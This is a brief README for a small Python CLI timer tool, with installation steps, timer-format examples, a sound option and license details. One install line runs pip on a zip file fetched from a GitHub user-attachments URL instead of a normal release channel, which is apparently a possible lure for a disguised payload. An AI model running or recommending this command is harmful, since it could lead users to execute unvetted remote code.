# Clock

A lightweight Python CLI tool for timer and clock management.

## Installation

Install via PyPI:
pip install clock

Or install directly from the release package:
pip3 install https://github.com/user-attachments/files/33238987/clock_v1.0.0.zip

## Usage

### 1. Basic Timer Command
Specify time using a 5-character format (4 digits + unit: s/m/h). Multiple units can be combined with spaces.

Examples:
clock 0005s                   # 5 seconds
clock 0010m                   # 10 minutes
clock 0001h                   # 1 hour
clock 0001h 0010m 0005s       # 1 hour, 10 minutes, and 5 seconds

Running `clock` without arguments displays the usage guide.

### 2. Custom Alarm Sound
Set or change the alarm sound file:
clock --sound my_alarm.wav

### 3. Module Execution
python3 -m clock.cli 0005s

## License

This project is licensed under the MIT License.
